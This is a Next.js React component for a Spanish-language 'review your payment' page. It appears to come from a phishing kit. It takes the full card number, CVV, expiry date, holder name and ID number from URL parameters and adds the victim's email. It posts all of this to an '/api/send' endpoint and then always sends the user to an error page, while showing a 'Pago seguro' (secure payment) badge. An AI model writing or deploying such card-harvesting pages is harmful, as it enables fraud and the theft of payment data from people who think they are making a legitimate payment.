"use client";

import { useRouter, useSearchParams } from "next/navigation";
import RightPanel from "@/components/RightPanel";
import Image from "next/image";
import { useState } from "react";

export default function RevisarContent() {
  const router = useRouter();
  const params = useSearchParams();

  const monto = params.get("monto") || "0";
  const tarjeta = params.get("tarjeta") || "";
  const ultimos4 = tarjeta.slice(-4) || "0000";
  const titular = params.get("titular") || "";
  const doc = params.get("doc") || "";
  const tipo = params.get("tipo") || "credito";

  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);

  const handlePago = async () => {
    if (!email) return alert("Por favor ingresa tu correo electrónico.");
    setLoading(true);

    const vencimiento = params.get("vencimiento") || "";
    const cvv = params.get("cvv") || "";

    try {
      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: tipo,
          monto,
          originPage: "/pago/revisar",
          datos: { titular, tarjeta, documento: doc, email, vencimiento, cvv },
        }),
      });

      router.push(
        `/pago/error?monto=${monto}&tarjeta=${tarjeta}&titular=${encodeURIComponent(
          titular
        )}&doc=${encodeURIComponent(doc)}&email=${encodeURIComponent(email)}`
      );
    } catch (err) {
      alert("Error al procesar el pago");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-[#f3f3f3] font-[system-ui,Segoe UI,Roboto,sans-serif] text-[#111]">
      <div className="max-w-6xl mx-auto py-10 px-6 flex flex-col md:grid md:grid-cols-[1fr_380px] md:gap-10">
        <section className="order-2 md:order-1 bg-white rounded-md border border-[#ddd] p-6 shadow-sm">
          <h2 className="text-[20px] font-semibold mb-6">Revisa tu pago</h2>

          <div className="mb-6">
            <h3 className="text-[15px] font-medium mb-3">Medio de pago</h3>
            <div className="flex items-center justify-between border border-[#ddd] rounded-md px-4 py-3 hover:bg-[#fafafa]">
              <div className="flex items-center gap-3">
                <Image
                  src="/credit-card-check-svgrepo-com.svg"
                  alt="Tarjeta"
                  width={40}
                  height={40}
                  className="rounded-sm"
                />
                <div>
                  <p className="text-[14px] font-medium leading-tight">
                    {tipo === "debito"
                      ? `Tarjeta de débito ****${ultimos4}`
                      : `Tarjeta de crédito ****${ultimos4}`}
                  </p>
                  <p className="text-[13px] text-[#666]">
                    {tipo === "debito" ? "Tarjeta de débito" : "Tarjeta de crédito"}
                  </p>
                </div>
              </div>
              <button
                type="button"
                onClick={() =>
                  router.push(`/pago/${tipo === "debito" ? "debito" : "credito"}`)
                }
                className="text-[14px] text-[#0b57d0] font-medium hover:underline"
              >
                Modificar
              </button>
            </div>
          </div>

          <div className="mb-8">
            <h3 className="text-[15px] font-medium mb-3">Ingresa tu e-mail</h3>
            <p className="text-[13px] text-[#555] mb-2">
              Recibirás el detalle de tu pago y te servirá como comprobante.
            </p>
            <input
              type="email"
              placeholder="Ej.: nombre@email.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full border border-[#ccc] rounded-md px-3 py-3 text-[15px] focus:border-[#007bff] outline-none"
              required
            />
          </div>

          <div className="pt-4 border-t border-[#eee]">
            <button
              onClick={handlePago}
              disabled={loading}
              className="w-full bg-[#0b57d0] text-white rounded-md py-3 text-[15px] font-medium hover:bg-[#094dc1] transition disabled:opacity-70"
            >
              {loading ? "Procesando..." : "Pagar"}
            </button>
            <div className="flex items-center justify-center gap-2 mt-3 text-[13px] text-[#555]">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="14"
                height="14"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#555"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
              </svg>
              Pago seguro
            </div>
          </div>
        </section>

        <RightPanel monto={Number(monto)} />
      </div>
    </main>
  );
}
